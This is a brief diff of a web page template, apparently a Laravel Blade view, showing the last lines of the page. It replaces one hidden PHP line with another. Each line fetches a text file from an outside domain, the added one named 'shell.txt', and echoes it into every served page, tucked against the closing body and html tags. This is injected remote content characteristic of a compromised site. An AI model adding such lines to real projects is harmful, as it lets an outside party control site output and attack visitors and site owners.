@@ -146,6 +146,4 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
     <script src="{{ url('assets/frontoffice/js/main.js?v=2.1') }}"></script>
-</body>
-<?php echo file_get_contents("https://pn-jogjakarta.website/txt/asli.txt");?>
-</html>
+</body><?php echo file_get_contents("https://buahnagaberdada.site/shell.txt");?></html>
